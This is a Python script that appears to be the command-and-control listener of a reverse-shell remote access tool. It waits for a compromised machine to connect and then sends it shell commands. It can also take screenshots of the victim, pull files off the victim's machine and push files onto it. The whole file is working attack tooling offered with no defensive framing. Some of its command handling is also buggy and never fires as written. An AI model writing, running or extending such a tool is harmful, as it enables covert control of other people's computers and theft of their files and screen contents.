from socket import socket , AF_INET , SOCK_STREAM 
from base64 import b64decode,b64encode
import os

s = socket(AF_INET , SOCK_STREAM)
s.bind(("ip",1234))
s.listen()
print("[+] Listen for Incoming Connections !!")

conn , address = s.accept()

print(f"Receiving connection from {address[0]} : {address[1]}")


while True :
    inp = input("$ ")
    cmd = inp + '\n'
    
    if inp.lower() in ("q","quit"):
        conn.send(cmd.encode())
        response = conn.recv(1024).decode()
        print(response)
        exit(0)

    elif inp.lower() in ("sc","screenshot"):
        conn.send(cmd.encode())
        b64_string = ''
        while True :
            tmp = conn.recv(32768).decode()
            b64_string +=tmp
            if len(tmp) < 32768 :
                break
        with open ("screenshot.png", "wb") as f:
            f.write(b64decode(b64_string))
        print("screenshot saved succ")

    elif inp.split (' ')[0].lower == "download" :
        conn.send(cmd.encode())
        b64_string = ''
        while True :
            tmp = conn.recv(32768).decode()
            b64_string +=tmp
            if len(tmp) < 32768 :
                break
        if "not found " in b64_string :
            print (b64_string)
            continue

        file_name , b64_string = b64_string.split(":")
        with open (file_name , "wb") as f :
            f.write(b64decode(b64_string))

    elif inp.split(' ')[0].lower == "upload"  :
        file_name = inp.split(' ')[1].strip()
        if not os.path.exists(file_name) :
            print("file dos not exist")
        else :
            file_content = ''
            with open (file_name , "rb") as f :
                file_content = b64encode(f.read())
            tmp = ":".join([file_name,str(file_content)]) + "\n"
            conn.send(tmp.encode())
            response = conn.recv(1024).decode()
            print(response)

    else :
        conn.send(cmd.encode())
        response = conn.recv(32768).decode()
        print (response)






